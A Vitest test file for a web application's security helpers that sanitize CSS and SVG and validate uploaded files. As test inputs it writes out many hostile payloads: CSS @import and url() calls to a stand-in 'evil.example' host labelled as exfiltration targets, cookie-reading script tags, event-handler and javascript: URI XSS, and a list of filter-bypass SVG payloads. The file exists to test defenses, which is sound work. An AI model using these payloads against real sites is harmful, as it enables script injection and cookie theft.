import { describe, it, expect } from "vitest";
import {
  sanitizeCss,
  sanitizeCssValue,
  validateUploadFile,
  isDangerousExtension,
  sanitizeSvg,
} from "@/lib/security";

describe("sanitizeCss", () => {
  it("strips @import rules, neutralizing the exfiltration target", () => {
    const out = sanitizeCss('@import url("https://evil.example/steal.css");');
    expect(out).not.toContain("evil.example");
    expect(out).toBe("/* @import removed */");
  });

  it("strips url() calls, neutralizing the exfiltration target", () => {
    const out = sanitizeCss('.bg { background: url(https://evil.example/x.png); }');
    expect(out).not.toContain("evil.example");
    expect(out).toBe(".bg { background: /* url() removed */; }");
  });

  it("strips expression(), neutralizing the script payload", () => {
    const out = sanitizeCss("width: expression(alert(1));");
    // expression(...) is replaced wholesale, so the call itself is gone —
    // only the (now-inert) comment marker remains, no live CSS expression.
    expect(out).toBe("width: /* expression() removed */);");
  });

  it("strips the javascript: prefix so the value can't be treated as a script URL", () => {
    const out = sanitizeCss("background: javascript:alert(1);");
    // The scheme prefix is replaced by a comment marker; without a live
    // "javascript:" prefix, the trailing "alert(1)" is inert text, not an
    // executable javascript: URL.
    expect(out).toBe("background: /* javascript: removed */alert(1);");
  });

  it("strips behavior (IE HTC)", () => {
    const out = sanitizeCss("behavior: url(evil.htc);");
    expect(out).not.toMatch(/behavior\s*:/i);
  });

  it("strips -moz-binding", () => {
    const out = sanitizeCss("-moz-binding: url(evil.xml#evil);");
    expect(out).not.toMatch(/-moz-binding\s*:/i);
  });

  it("leaves ordinary safe CSS untouched", () => {
    const css = ".card { color: #333; font-size: 14px; padding: 1rem; }";
    expect(sanitizeCss(css)).toBe(css);
  });
});

describe("sanitizeCssValue", () => {
  it("strips angle brackets and quotes-breaking chars", () => {
    expect(sanitizeCssValue("</style><script>alert(1)</script>")).not.toMatch(/[<>]/);
  });

  it("strips semicolons used to break out of a declaration", () => {
    expect(sanitizeCssValue("red; background: url(evil)")).not.toContain(";");
  });

  it("keeps a normal font-family value intact", () => {
    expect(sanitizeCssValue("'Helvetica Neue', Arial, sans-serif")).toBe(
      "'Helvetica Neue', Arial, sans-serif"
    );
  });

  it("keeps a normal color/size value intact", () => {
    expect(sanitizeCssValue("#3b82f6")).toBe("#3b82f6");
    expect(sanitizeCssValue("1.5rem")).toBe("1.5rem");
  });
});

describe("validateUploadFile", () => {
  it("accepts an allowed image extension", () => {
    const result = validateUploadFile("photo.png", 1024);
    expect(result).toEqual({ valid: true, ext: "png" });
  });

  it("is case-insensitive on extension", () => {
    const result = validateUploadFile("photo.PNG", 1024);
    expect(result).toEqual({ valid: true, ext: "png" });
  });

  it("rejects a disallowed extension", () => {
    const result = validateUploadFile("shell.php", 1024);
    expect(result.valid).toBe(false);
  });

  it("rejects an executable disguised with a double extension's real ext", () => {
    const result = validateUploadFile("invoice.pdf.exe", 1024);
    expect(result.valid).toBe(false);
  });

  it("rejects a file with no extension", () => {
    const result = validateUploadFile("noextension", 1024);
    expect(result.valid).toBe(false);
  });

  it("rejects a file over the size limit", () => {
    const result = validateUploadFile("big.png", 11 * 1024 * 1024);
    expect(result.valid).toBe(false);
  });

  it("accepts a file right at the size limit", () => {
    const result = validateUploadFile("edge.png", 10 * 1024 * 1024);
    expect(result.valid).toBe(true);
  });
});

describe("isDangerousExtension", () => {
  it("flags svg as dangerous", () => {
    expect(isDangerousExtension("svg")).toBe(true);
    expect(isDangerousExtension("SVG")).toBe(true);
  });

  it("does not flag ordinary raster images", () => {
    expect(isDangerousExtension("png")).toBe(false);
    expect(isDangerousExtension("jpg")).toBe(false);
  });
});

describe("sanitizeSvg", () => {
  it("strips <script> tags and their contents", () => {
    const out = sanitizeSvg('<svg><script>alert(document.cookie)</script></svg>');
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toContain("alert(document.cookie)");
  });

  it("strips event handler attributes", () => {
    const out = sanitizeSvg('<svg onload="alert(1)"><rect onclick="alert(2)"/></svg>');
    expect(out).not.toMatch(/onload\s*=/i);
    expect(out).not.toMatch(/onclick\s*=/i);
  });

  it("neutralizes javascript: URIs", () => {
    const out = sanitizeSvg('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toMatch(/javascript\s*:/i);
  });

  it("neutralizes vbscript: URIs", () => {
    const out = sanitizeSvg('<a href="vbscript:msgbox(1)">click</a>');
    expect(out).not.toMatch(/vbscript\s*:/i);
  });

  it("strips <foreignObject> (HTML/script smuggling vector)", () => {
    const out = sanitizeSvg(
      '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>'
    );
    expect(out).not.toMatch(/foreignObject/i);
    expect(out).not.toContain("alert(1)");
  });

  it("strips <use> elements referencing external resources", () => {
    const out = sanitizeSvg('<svg><use xlink:href="https://evil.example/payload.svg#x"/></svg>');
    expect(out).not.toMatch(/xlink:href/i);
  });

  it("strips inline <style> blocks", () => {
    const out = sanitizeSvg('<svg><style>body{background:url(evil)}</style></svg>');
    expect(out).not.toMatch(/<style/i);
  });

  it("strips style attributes containing @import", () => {
    const out = sanitizeSvg('<rect style="fill:red;@import url(evil.css)"/>');
    expect(out).not.toMatch(/@import/i);
  });

  it("neutralizes data: URIs in href", () => {
    const out = sanitizeSvg('<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>');
    expect(out).not.toMatch(/data:/i);
  });

  it("leaves benign SVG markup intact", () => {
    // The parser writes every tag closed rather than self-closed, which is
    // still well-formed XML — so this compares what the picture says, not how
    // the markup happens to be spelled.
    const out = sanitizeSvg('<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#f00"/></svg>');
    expect(out).toContain('viewBox="0 0 10 10"');
    expect(out).toContain('cx="5"');
    expect(out).toContain('fill="#f00"');
    expect(out).toMatch(/<circle[^>]*>/);
  });

  it("keeps the parts a standalone file needs to draw at all", () => {
    const out = sanitizeSvg(
      '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">' +
        '<defs><linearGradient id="g"><stop offset="0" stop-color="#f00"/></linearGradient></defs>' +
        '<path d="M4 4h16v16H4z" stroke-dasharray="2 2" fill="url(#g)"/></svg>',
    );
    // Without the namespace a .svg file renders as nothing, and `viewBox`
    // lower-cased is not `viewBox` any more once the file is read as XML.
    expect(out).toContain('xmlns="http://www.w3.org/2000/svg"');
    expect(out).toContain('viewBox="0 0 24 24"');
    expect(out).toContain("linearGradient");
    expect(out).toContain('stroke-dasharray="2 2"');
    expect(out).toContain('fill="url(#g)"');
  });

  describe("the shapes a regular expression could not see", () => {
    // Each of these went through the old text-matching version untouched.
    const bypasses: [string, string][] = [
      ["an unquoted handler", "<svg onload=alert(1)></svg>"],
      ["a handler broken over lines", "<svg onload\n=\nalert(1)></svg>"],
      ["a handler in capitals", '<svg ONLOAD="alert(1)"></svg>'],
      ["a script tag that is never closed", '<svg><script src="https://evil.example/x.js"></svg>'],
      ["an entity-encoded colon", '<svg><a xlink:href="javascript&#58;alert(1)"><text>x</text></a></svg>'],
      ["an animation that sets a URL later", '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>'],
      ["an animation that sets a handler later", '<svg><set attributeName="onload" to="alert(1)"/></svg>'],
      ["a document smuggled in as a picture", '<svg><image href="data:text/html,<script>alert(1)</script>"/></svg>'],
    ];

    for (const [what, payload] of bypasses) {
      it(`drops ${what}`, () => {
        const out = sanitizeSvg(payload);
        expect(out).not.toMatch(/\son\w+\s*=/i);
        expect(out).not.toMatch(/<script/i);
        expect(out).not.toMatch(/javascript\s*:/i);
        expect(out).not.toMatch(/data:text\/html/i);
        expect(out).not.toMatch(/<(?:animate|set)\b/i);
      });
    }
  });
});
